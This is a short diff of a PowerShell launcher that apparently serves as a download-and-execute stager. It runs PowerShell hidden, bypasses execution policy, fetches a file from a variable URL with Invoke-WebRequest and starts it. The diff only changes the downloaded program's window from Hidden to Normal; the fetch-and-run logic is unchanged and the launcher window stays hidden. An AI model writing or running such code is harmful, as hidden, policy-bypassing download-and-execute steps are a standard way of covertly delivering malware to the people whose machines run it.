@@ -7,7 +7,7 @@ $psi.FileName = "powershell"
 $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "& { 
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
     Invoke-WebRequest -Uri '$url' -OutFile '$savePath' -ErrorAction Stop; 
-    if (Test-Path '$savePath') { Start-Process -FilePath '$savePath' -WindowStyle Hidden }
+    if (Test-Path '$savePath') { Start-Process -FilePath '$savePath' -WindowStyle Normal }
 }""
 $psi.UseShellExecute = $false
 $psi.CreateNoWindow = $true
